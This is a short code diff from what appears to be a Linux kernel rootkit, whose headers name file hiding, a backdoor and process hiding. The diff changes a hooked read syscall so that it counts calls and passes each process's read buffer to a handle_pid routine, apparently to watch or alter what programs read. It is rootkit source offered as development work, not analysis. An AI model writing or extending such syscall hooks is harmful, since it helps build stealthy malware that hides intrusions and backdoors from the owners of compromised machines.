@@ -12,6 +12,7 @@
 #include "filehide.h"
 #include "backdoor.h"
 #include "hidepid.h"
+#include "read.h"
 
 extern rootkit_t rootkit;
 
@@ -96,7 +97,17 @@ enable_protection(void)
 asmlinkage ssize_t
 g7_read(const struct pt_regs *pt_regs)
 {
-    return sys_read(pt_regs);
+    atomic_inc(&read_count);
+    long ret = sys_read(pt_regs);
+
+    //Just like the SystemV-CC (ignoring fd)
+    char *buf = (char *)pt_regs->si;
+    size_t count = pt_regs->dx;
+
+    handle_pid(current->pid, buf, count);
+
+    atomic_dec(&read_count);
+    return ret;
 }
 
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
